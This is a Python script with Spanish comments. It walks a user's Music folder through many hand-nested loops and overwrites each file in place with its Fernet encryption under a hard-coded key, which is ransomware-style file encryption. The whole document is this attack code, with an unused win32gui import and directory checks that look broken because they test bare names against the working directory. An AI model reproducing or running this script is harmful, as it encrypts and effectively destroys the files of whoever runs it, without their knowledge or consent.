import os
from cryptography.fernet import Fernet
from time import sleep
import getpass
import win32gui


key = "WAtwOBx5AhG50nQUfdpesn8CF4XVsDt-1uWEbtKF9mE="

user = getpass.getuser()

pat = f"/Users/{user}/Music"
path = os.listdir(pat)
for i in path:
    dir_path = os.path.isdir(i)
    if dir_path == True:
        print(i)
        list = os.listdir(f"{pat}/{i}")
        #encrypt parte 2 de la encriptacion
        for qq in list:
            try:
                with open(f"{pat}/{i}/{qq}", "rb") as file:
                    data = file.read()
                    file.close()
                f = Fernet(key)
                encry = f.encrypt(data)
                with open(f"{pat}/{i}/{qq}", "wb") as file:
                    file.write(encry)
                    file.close()
                    print(f"{qq} encriptado")
            except:
                print("No se pudo encriptar")
        for j in list:
            dir_path = os.path.isdir(j)
            if dir_path == True:
                print(j)
                list = os.listdir(f"{pat}/{i}/{j}")
                #segun la parte 2 de la encriptacion
                for qq in list:
                    try:
                        with open(f"{pat}/{i}/{j}/{qq}", "rb") as file:
                            data = file.read()
                            file.close()
                        f = Fernet(key)
                        encry = f.encrypt(data)
                        with open(f"{pat}/{i}/{j}/{qq}", "wb") as file:
                            file.write(encry)
                            file.close()
                            print(f"{qq} encriptado")
                    except:
                        print("No se pudo encriptar")
                
                
                
                for k in list:
                    dir_path = os.path.isdir(k)
                    if dir_path == True:
                        print(k)
                        list = os.listdir(f"{pat}/{i}/{j}/{k}")
                        #tercera parte de la encriptacion
                        for qq in list:
                            try:
                                with open(f"{pat}/{i}/{j}/{k}/{qq}", "rb") as file:
                                    data = file.read()
                                    file.close()
                                f = Fernet(key)
                                encry = f.encrypt(data)
                                with open(f"{pat}/{i}/{j}/{k}/{qq}", "wb") as file:
                                    file.write(encry)
                                    file.close()
                                    print(f"{qq} encriptado")
                            except:
                                print("No se pudo encriptar")
                        
                        
                        for l in list:
                            dir_path = os.path.isdir(l)
                            if dir_path == True:
                                print(l)
                                list = os.listdir(f"{pat}/{i}/{j}/{k}/{l}")
                                #cuarta parte de la encriptacion
                                for qq in list:
                                    try:
                                        with open(f"{pat}/{i}/{j}/{k}/{l}/{qq}", "rb") as file:
                                            data = file.read()
                                            file.close()
                                        f = Fernet(key)
                                        encry = f.encrypt(data)
                                        with open(f"{pat}/{i}/{j}/{k}/{l}/{qq}", "wb") as file:
                                            file.write(encry)
                                            file.close()
                                            print(f"{qq} encriptado")
                                    except:
                                        print("No se pudo encriptar")
                                
                                
                                for m in list:
                                    dir_path = os.path.isdir(m)
                                    if dir_path == True:
                                        print(m)
                                        list = os.listdir(f"{pat}/{i}/{j}/{k}/{l}/{m}")
                                        #quinta parte de la encriptacion
                                        for qq in list:
                                            try:
                                                with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{qq}", "rb") as file:
                                                    data = file.read()
                                                    file.close()
                                                f = Fernet(key)
                                                encry = f.encrypt(data)
                                                with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{qq}", "wb") as file:
                                                    file.write(encry)
                                                    file.close()
                                                    print(f"{qq} encriptado")
                                            except:
                                                print("No se pudo encriptar")
                                                
                                                
                                                
                                        for n in list:
                                            dir_path = os.path.isdir(n)
                                            if dir_path == True:
                                                print(n)
                                                list = os.listdir(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}")
                                                #sexta parte de la encriptacion
                                                for qq in list:
                                                    try:
                                                        with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{qq}", "rb") as file:
                                                            data = file.read()
                                                            file.close()
                                                        f = Fernet(key)
                                                        encry = f.encrypt(data)
                                                        with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{qq}", "wb") as file:
                                                            file.write(encry)
                                                            file.close()
                                                            print(f"{qq} encriptado")
                                                    except:
                                                        print("No se pudo encriptar")
                                                        
                                                        
                                                for o in list:
                                                    dir_path = os.path.isdir(o)
                                                    if dir_path == True:
                                                        print(o)
                                                        list = os.listdir(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}")
                                                        #septima parte de la encriptacion
                                                        for qq in list:
                                                            try:
                                                                with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{qq}", "rb") as file:
                                                                    data = file.read()
                                                                    file.close()
                                                                f = Fernet(key)
                                                                encry = f.encrypt(data)
                                                                with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{qq}", "wb") as file:
                                                                    file.write(encry)
                                                                    file.close()
                                                                    print(f"{qq} encriptado")
                                                            except:
                                                                print(f"{qq} No fue encriptado")
                                                        
                                                        
                                                        for p in list:
                                                            dir_path = os.path.isdir(p)
                                                            if dir_path == True:
                                                                print(p)
                                                                list = os.listdir(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}")
                                                                #octava parte de la encriptacion
                                                                for qq in list:
                                                                    try:
                                                                        with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{qq}", "rb") as file:
                                                                            data = file.read()
                                                                            file.close()
                                                                        f = Fernet(key)
                                                                        encry = f.encrypt(data)
                                                                        with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{qq}", "wb") as file:
                                                                            file.write(encry)
                                                                            file.close()
                                                                            print(f"{qq} encriptado")
                                                                    except:
                                                                        print(f"{qq} No fue encriptado")
                                                                
                                                                for q in list:
                                                                    dir_path = os.path.isdir(q)
                                                                    if dir_path == True:
                                                                        print(q)
                                                                        list = os.listdir(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{q}")
                                                                        #novena parte de la encriptacion
                                                                        for qq in list:
                                                                            try:
                                                                                with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{q}/{qq}", "rb") as file:
                                                                                    data = file.read()
                                                                                    file.close()
                                                                                f = Fernet(key)
                                                                                encry = f.encrypt(data)
                                                                                with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{q}/{qq}", "wb") as file:
                                                                                    file.write(encry)
                                                                                    file.close()
                                                                                    print(f"{qq} encriptado")
                                                                            except:
                                                                                print(f"{qq} No fue encriptado")
                                                                        
                                                                        for r in list:
                                                                            dir_path = os.path.isdir(r)
                                                                            if dir_path == True:
                                                                                print(r)
                                                                                list = os.listdir(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{q}/{r}")
                                                                                #decima parte de la encriptacion
                                                                                for qq in list:
                                                                                    try:
                                                                                        with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{q}/{r}/{qq}", "rb") as file:
                                                                                            data = file.read()
                                                                                            file.close()
                                                                                        f = Fernet(key)
                                                                                        encry = f.encrypt(data)
                                                                                        with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{q}/{r}/{qq}", "wb") as file:
                                                                                            file.write(encry)
                                                                                            file.close()
                                                                                            print(f"{qq} encriptado")
                                                                                    except:
                                                                                        print(f"{qq} No fue encriptado")
                                                                                        